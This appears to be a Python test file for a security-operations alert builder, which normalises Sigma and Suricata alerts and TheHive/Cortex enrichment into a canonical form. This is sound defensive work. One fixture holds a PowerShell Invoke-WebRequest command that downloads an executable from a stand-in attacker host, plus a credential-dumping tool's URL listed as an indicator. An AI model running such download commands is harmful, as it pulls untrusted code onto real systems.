from __future__ import annotations

from alert_builder import build_canonical_alert


def _sigma_raw_alert():
    # Matches the n8n Alert Builder output shape documented in
    # SOC-3s-ARCHITECTURE-v2.md §3.
    return {
        "type": "sigma",
        "source": "security-onion",
        "sourceRef": "6qS9fp8BiUkBvoTNPeON",
        "title": "[HIGH] Suspicious Invoke-WebRequest Execution - win-kvkmd51ggkq",
        "description": (
            "Detection engine: sigma\n"
            "Rule: Suspicious Invoke-WebRequest Execution (5e3cc4d8-3e68-43db-8656-eaaeefdec9cc)\n"
            "Host: win-kvkmd51ggkq (172.20.24.99)\n"
            "Agent ID: 1a52ee32-ef93-4f5a-b876-65bd1b7c795a\n"
            "Command line: powershell.exe -c Invoke-WebRequest -Uri https://evil.example/x.exe"
        ),
        "severity": 3,
        "tlp": 2,
        "pap": 2,
        "date": 1784710559000,
        "tags": [
            "172.20.24.99",
            "agent-id:1a52ee32-ef93-4f5a-b876-65bd1b7c795a",
            "engine:sigma",
            "rule:Suspicious Invoke-WebRequest Execution",
            "security-onion",
            "win-kvkmd51ggkq",
        ],
        "observables": [
            {"dataType": "domain", "data": "github.com", "ioc": True},
            {
                "dataType": "url",
                "data": "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe",
                "ioc": True,
            },
            {
                "dataType": "domain",
                "data": "https://evil.example/payload",
                "ioc": True,
            },
            {
                "dataType": "hash",
                "data": "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94",
                "ioc": True,
                "tags": ["sha256"],
            },
            {
                "dataType": "hash",
                "data": "bf7a6e7a62c3f5b2e8e069438ac1dd3d",
                "ioc": False,
                "tags": ["imphash"],
            },
        ],
    }


def _hive_alert():
    return {
        "_id": "~1156182192",
        "observables": [
            {
                "_id": "~506892376",
                "dataType": "hash",
                "data": "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94",
                "reports": {
                    "VirusTotal_GetReport_3_0": {
                        "summary": {
                            "taxonomies": [
                                {"level": "malicious", "namespace": "VT", "predicate": "detections", "value": "40/70"},
                            ]
                        }
                    }
                },
            },
            {
                "_id": "~506892377",
                "dataType": "domain",
                "data": "github.com",
                "reports": {},
            },
        ],
    }


def test_build_canonical_alert_parses_rule_and_host_from_description():
    alert = build_canonical_alert(_sigma_raw_alert(), None, {}, thehive_alert_id="~1156182192")

    assert alert.alert_id == "~1156182192"
    assert alert.source_engine == "sigma"
    assert alert.investigation_profile == "endpoint_behavior"
    assert alert.rule.name == "Suspicious Invoke-WebRequest Execution"
    assert alert.rule.uuid == "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc"
    assert alert.rule.native_severity == 3
    assert alert.host.hostname == "win-kvkmd51ggkq"
    assert alert.host.ip == ["172.20.24.99"]
    assert "Invoke-WebRequest" in alert.process.command_line


def test_build_canonical_alert_corrects_mislabeled_url_observable():
    alert = build_canonical_alert(_sigma_raw_alert(), None, {}, thehive_alert_id="~1156182192")

    # dataType said "domain" but the value starts with https:// — must land in urls, not domains.
    assert "https://evil.example/payload" in alert.observables.urls
    assert "https://evil.example/payload" not in alert.observables.domains
    assert "github.com" in alert.observables.domains
    assert "1c84c8632c5269f24876ed9f49fa810b49f77e1e92e8918fc164c34b020f9a94" in alert.observables.hashes.sha256
    assert "bf7a6e7a62c3f5b2e8e069438ac1dd3d" in alert.observables.hashes.imphash


def test_build_canonical_alert_maps_cortex_reports_from_hive_fetch():
    alert = build_canonical_alert(_sigma_raw_alert(), _hive_alert(), {"business_criticity": "high"})

    assert alert.asset_context["business_criticity"] == "high"
    assert alert.thehive_observable_ids["github.com"] == "~506892377"
    assert len(alert.cortex_results) == 1
    result = alert.cortex_results[0]
    assert result.verdict == "malicious"
    assert result.analyzer == "VirusTotal_GetReport_3_0"
    assert result.score == 90


def test_build_canonical_alert_handles_missing_hive_alert():
    alert = build_canonical_alert(_sigma_raw_alert(), None, {})
    assert alert.cortex_results == []
    assert alert.thehive_observable_ids == {}


def test_build_canonical_alert_falls_back_when_description_unparseable():
    raw = {
        "type": "suricata",
        "title": "ET SCAN Possible Nmap",
        "description": "no structured fields here",
        "severity": 2,
        "date": 1784710559000,
        "tags": [],
        "observables": [{"dataType": "ip", "data": "203.0.113.5", "ioc": True}],
    }
    alert = build_canonical_alert(raw, None, {})

    assert alert.source_engine == "suricata"
    assert alert.investigation_profile == "network_threat"
    assert alert.rule.name == "ET SCAN Possible Nmap"
    assert alert.rule.uuid == ""
    assert alert.host is None
    assert "203.0.113.5" in alert.observables.external_ips
